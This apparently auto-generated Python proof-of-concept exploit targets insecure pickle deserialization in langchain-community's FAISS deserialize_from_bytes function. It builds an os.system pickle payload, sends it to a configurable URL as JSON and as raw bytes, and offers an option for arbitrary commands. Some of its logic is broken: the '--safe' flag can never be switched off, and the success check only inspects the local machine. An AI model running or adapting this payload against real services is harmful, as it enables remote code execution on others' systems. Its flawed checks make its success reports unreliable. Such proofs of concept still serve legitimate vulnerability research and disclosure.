#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_calls_deserialize_from_bytes_4.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure deserialization in langchain-community-only.

Vulnerability: The function deserialize_from_bytes in FAISS vectorstore calls
pickle.loads on attacker-controlled input without any validation, leading to
arbitrary code execution.

This PoC demonstrates the vulnerability by sending a malicious pickle payload
that creates a marker file at /tmp/poc_success.txt to prove code execution.
"""

import pickle
import os
import sys
import requests
import base64
import argparse

# Configuration - modify these as needed
TARGET_URL = "http://localhost:8000/api/v1/trigger"
TIMEOUT = 10  # seconds

def create_malicious_payload(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes the given command.
    
    Uses __reduce__ to execute arbitrary code during deserialization.
    The payload will execute the command when pickle.loads() is called.
    """
    class MaliciousPickle:
        def __reduce__(self):
            # This will execute the command via os.system
            return (os.system, (command,))
    
    # Serialize the malicious object
    payload = pickle.dumps(MaliciousPickle())
    return payload

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community FAISS insecure deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--safe",
        action="store_true",
        default=True,
        help="Use safe payload (default: True)"
    )
    
    args = parser.parse_args()
    
    # Create the malicious payload
    if args.safe:
        print("[*] Using safe payload: touch /tmp/poc_success.txt")
        command = "touch /tmp/poc_success.txt"
    else:
        command = args.command
        print(f"[*] Using custom command: {command}")
    
    try:
        # Generate the malicious pickle payload
        malicious_bytes = create_malicious_payload(command)
        
        # Encode as base64 for HTTP transmission (common pattern)
        payload_b64 = base64.b64encode(malicious_bytes).decode()
        
        print(f"[*] Target URL: {args.target}")
        print(f"[*] Payload size: {len(malicious_bytes)} bytes")
        print(f"[*] Sending malicious pickle payload...")
        
        # Send the request - the exact format depends on the API
        # Common patterns: JSON body, form data, or raw bytes
        # We'll try multiple approaches
        
        # Approach 1: JSON body with base64-encoded payload
        try:
            response = requests.post(
                args.target,
                json={"serialized": payload_b64},
                timeout=TIMEOUT
            )
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:500]}")
        except requests.exceptions.RequestException as e:
            print(f"[!] JSON approach failed: {e}")
        
        # Approach 2: Raw bytes in body
        try:
            response = requests.post(
                args.target,
                data=malicious_bytes,
                headers={"Content-Type": "application/octet-stream"},
                timeout=TIMEOUT
            )
            print(f"[*] Raw bytes response status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Raw bytes approach failed: {e}")
        
        # Check if the command was executed
        if command == "touch /tmp/poc_success.txt":
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] SUCCESS! File /tmp/poc_success.txt was created.")
                print("[+] This confirms arbitrary code execution via pickle deserialization.")
                # Clean up
                os.remove("/tmp/poc_success.txt")
                print("[*] Cleaned up marker file.")
            else:
                print("[!] Marker file not found. The exploit may not have worked.")
                print("[!] Check if the target is running and the endpoint is correct.")
        else:
            print(f"[*] Custom command executed. Verify results manually.")
            
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    print("=" * 60)
    print("langchain-community FAISS Insecure Deserialization PoC")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates CVE-like vulnerability in")
    print("[*] deserialize_from_bytes() which calls pickle.loads()")
    print("[*] on untrusted input without validation.")
    print()
    
    main()
